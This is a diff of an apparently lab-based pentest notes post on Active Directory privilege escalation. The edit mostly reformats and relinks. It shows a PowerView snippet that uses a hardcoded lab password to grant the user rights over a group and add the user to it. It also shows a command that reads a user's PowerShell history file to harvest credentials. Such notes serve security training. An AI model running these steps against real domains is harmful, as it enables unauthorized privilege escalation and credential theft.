@@ -8,20 +8,14 @@ tags: [active directory, windows privesc, readlaps, sysvol share, powershell his
 show_image_post: false                                    # Change this to true
 #image: /assets/img/machine-0-infocard.png                # Add infocard image here for post preview image
 ---
+This is a collection of techniques to get Domain Admin via multiple techniques.
 ### Assign user to a group
-
-This is a repository of techniques to get Domain Admin via multiple techniques.
 ```powershell
 Import-Module ./PowerView.ps1
-
 $SecPassword = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force
-
 $Cred = New-Object System.Management.Automation.PSCredential('streamio\\JDgodd', $SecPassword)
-
 Add-DomainObjectAcl -Credential $Cred -TargetIdentity "Core Staff" -principalidentity "streamio\\JDgodd"
-
 Add-DomainGroupMember -Identity 'Core Staff' -Members 'streamio\\JDgodd' -Credential $Cred
-
 net group 'Core Staff'
 ```
 Examples:
@@ -79,4 +73,4 @@ We can retrieve commands executed on another machine by checking the ConsoleHost
 PS C:\Users\legacyy> type AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 ```
 Examples:
-[[Timelapse#^3ceb21]]
+[Timelapse](https://shuciran.github.io/posts/Timelapse/#fnref:powershell-history)
